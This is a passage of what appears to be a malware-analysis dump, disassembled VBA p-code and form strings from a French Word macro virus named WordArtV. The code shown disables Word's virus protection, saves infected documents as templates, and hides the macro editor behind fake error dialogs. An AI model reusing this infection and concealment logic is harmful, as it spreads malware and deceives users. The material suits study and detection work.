+' 	LitStr 0x001C "WordArtV vous a contaminé..."
+' 	Ld vbExclamation 
+' 	LitStr 0x000F "ZeMacroKiller98"
+' 	ArgsCall MsgBox 0x0003 
+' Line #122:
+' 	EndIfBlock 
+' Line #123:
+' 	Ld Choix 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	Paren 
+' 	Ld Choix 
+' 	LitDI2 0x0003 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	Ld Choix 
+' 	LitDI2 0x0005 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #124:
+' 	LitStr 0x002C "ZeMacroKiller98 et WordArtV vous remercie..."
+' 	Ld vbInformation 
+' 	LitStr 0x000B "HAHAHAHAHA!"
+' 	ArgsCall MsgBox 0x0003 
+' Line #125:
+' 	EndIfBlock 
+' Line #126:
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' Line #127:
+' 	EndSub 
+' Line #128:
+' 	FuncDefn (Sub FileSaveAs())
+' Line #129:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #130:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #131:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #132:
+' 	OnError ErrorFSA 
+' Line #133:
+' 	Ld wdDialogFileSaveAs 
+' 	ArgsLd Dialogs 0x0001 
+' 	ArgsMemCall Show 0x0000 
+' Line #134:
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatDocument 
+' 	Eq 
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatTemplate 
+' 	Eq 
+' 	Paren 
+' 	Or 
+' 	IfBlock 
+' Line #135:
+' 	Ld wdFormatTemplate 
+' 	ParamNamed FileFormat 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall SaveAs 0x0001 
+' Line #136:
+' 	EndIfBlock 
+' Line #137:
+' 	Label ErrorFSA 
+' Line #138:
+' 	EndSub 
+' Line #139:
+' 	FuncDefn (Sub FileTemplates())
+' Line #140:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #141:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #142:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #143:
+' 	OnError ErrorFT 
+' Line #144:
+' 	Ld UserForm900 
+' 	ArgsMemCall Show 0x0000 
+' Line #145:
+' 	Label ErrorFT 
+' Line #146:
+' 	EndSub 
+' Line #147:
+' 	FuncDefn (Sub ToolsMacro())
+' Line #148:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #149:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #150:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #151:
+' 	OnError ErrorTM 
+' Line #152:
+' 	Ld UserForm999 
+' 	ArgsMemCall Show 0x0000 
+' Line #153:
+' 	Label ErrorTM 
+' Line #154:
+' 	EndSub 
+' Line #155:
+' 	FuncDefn (Sub ViewVBCode())
+' Line #156:
+' 	Ld wdCancelDisabled 
+' 	Ld Application 
+' 	MemSt EnableCancelKey 
+' Line #157:
+' 	LitDI2 0x0000 
+' 	Ld WordBasic 
+' 	ArgsMemCall DisableAutoMacros 0x0001 
+' Line #158:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #159:
+' 	OnError ErrorVVBC 
+' Line #160:
+' 	LitStr 0x0045 "Ce programme a réalisé une opérartion illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #161:
+' 	Label ErrorVVBC 
+' Line #162:
+' 	EndSub 
+' Macros/VBA/UserForm900 - 3118 bytes
+' Line #0:
+' Line #1:
+' Line #2:
+' Line #3:
+' Line #4:
+' 	FuncDefn (Private Sub CommandButton1_Click())
+' Line #5:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #6:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #7:
+' 	EndSub 
+' Line #8:
+' Line #9:
+' 	FuncDefn (Private Sub CommandButton2_Click())
+' Line #10:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #11:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #12:
+' 	EndSub 
+' Line #13:
+' Line #14:
+' 	FuncDefn (Private Sub CommandButton3_Click())
+' Line #15:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #16:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #17:
+' 	EndSub 
+' Line #18:
+' Line #19:
+' 	FuncDefn (Private Sub CommandButton4_Click())
+' Line #20:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #21:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #22:
+' 	EndSub 
+' Line #23:
+' Line #24:
+' 	FuncDefn (Private Sub CommandButton5_Click())
+' Line #25:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ParamNamed Title 
+' 	ArgsCall MsgBox 0x0003 
+' Line #26:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #27:
+' 	EndSub 
+' Line #28:
+' Line #29:
+' 	FuncDefn (Private Sub CommandButton6_Click())
+' Line #30:
+' 	Ld UserForm900 
+' 	ArgsCall Unlock 0x0001 
+' Line #31:
+' 	EndSub 
+' Line #32:
+' Line #33:
+' 	FuncDefn (Private Sub UserForm_Initialize())
+' Line #34:
+' 	Ld NormalTemplate 
+' 	MemLd New 
+' 	Ld TextBox1 
+' 	MemSt Then 
+' Line #35:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton2 
+' 	MemSt Enabled 
+' Line #36:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #37:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #38:
+' 	EndSub 
+' Macros/VBA/UserForm999 - 4756 bytes
+' Line #0:
+' Line #1:
+' Line #2:
+' Line #3:
+' Line #4:
+' Line #5:
+' Line #6:
+' Line #7:
+' Line #8:
+' 	FuncDefn (Private Sub ListBox1_Click())
+' Line #9:
+' 	LitDI2 0x0000 
+' 	Ld ListBox1 
+' 	ArgsMemLd Selected 0x0001 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #10:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #11:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #12:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #13:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #14:
+' 	LitDI2 0x0001 
+' 	Ld ListBox1 
+' 	ArgsMemLd Selected 0x0001 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	ElseIfBlock 
+' Line #15:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #16:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #17:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #18:
+' 	LitVarSpecial (True)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #19:
+' 	ElseBlock 
+' Line #20:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #21:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #22:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton4 
+' 	MemSt Enabled 
+' Line #23:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton6 
+' 	MemSt Enabled 
+' Line #24:
+' 	EndIfBlock 
+' Line #25:
+' 	EndSub 
+' Line #26:
+' Line #27:
+' 	FuncDefn (Private Sub UserForm_Initialize())
+' Line #28:
+' 	LitStr 0x000D "Commande Word"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #29:
+' 	LitStr 0x0017 "Tous les modèles actifs"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #30:
+' 	LitStr 0x001A "Normal.dot (modèle global)"
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #31:
+' 	Ld WordBasic 
+' 	ArgsMemLd WindowName$ 0x0000 
+' 	Ld ComboBox1 
+' 	ArgsMemCall AddItem 0x0001 
+' Line #32:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton1 
+' 	MemSt Enabled 
+' Line #33:
+' 	LitVarSpecial (False)
+' 	Ld CommandButton3 
+' 	MemSt Enabled 
+' Line #34:
+' 	LitStr 0x000F "Macro créée le "
+' 	Ld Date 
+' 	Concat 
+' 	LitStr 0x0005 " par "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	Ld TextBox2 
+' 	MemSt Then 
+' Line #35:
+' 	EndSub 
+' Line #36:
+' Line #37:
+' 	FuncDefn (Private Sub CommandButton1_Click())
+' Line #38:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #39:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #40:
+' 	EndSub 
+' Line #41:
+' 	FuncDefn (Private Sub CommandButton2_Click())
+' Line #42:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #43:
+' 	EndSub 
+' Line #44:
+' Line #45:
+' 	FuncDefn (Private Sub CommandButton3_Click())
+' Line #46:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #47:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #48:
+' 	EndSub 
+' Line #49:
+' Line #50:
+' 	FuncDefn (Private Sub CommandButton4_Click())
+' Line #51:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #52:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #53:
+' 	EndSub 
+' Line #54:
+' Line #55:
+' 	FuncDefn (Private Sub CommandButton5_Click())
+' Line #56:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #57:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #58:
+' 	EndSub 
+' Line #59:
+' Line #60:
+' 	FuncDefn (Private Sub CommandButton6_Click())
+' Line #61:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #62:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #63:
+' 	EndSub 
+' Line #64:
+' Line #65:
+' 	FuncDefn (Private Sub CommandButton7_Click())
+' Line #66:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #67:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #68:
+' 	EndSub 
+' Line #69:
+' 	FuncDefn (Private Sub ScrollBar1_Change())
+' Line #70:
+' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
+' 	Ld vbCritical 
+' 	LitStr 0x000E "Microsoft Word"
+' 	ArgsCall MsgBox 0x0003 
+' Line #71:
+' 	Ld UserForm999 
+' 	ArgsCall Unlock 0x0001 
+' Line #72:
+' 	EndSub 
+' Line #73:
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Mod�le de document gS
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Mise � jour automatique des styles de document
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Mod�les globaux et compl�mentsB
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Les �l�ments coch�s sont d�j� en m�moire.pE
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Attacher...
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ajouter
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Supprimer..
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Organiser...E
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Annuler
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Chemin d'acc�s:
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tahoma@
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+H�,? 
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Tous les mod�les actifs
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Nom de la macro:0
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Macros disponibles dans::
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Description:�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ex�cuter
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Annuler
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Ex�cuter pas � pas
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Modifier
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Cr�er
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�Supprimer...
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Organiser...
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Arial
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'0'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm900'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b''
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'Tous les mod\xe8les actifs'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Intended.Art' - OLE stream: 'Macros/UserForm999'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+None
+-------------------------------------------------------------------------------
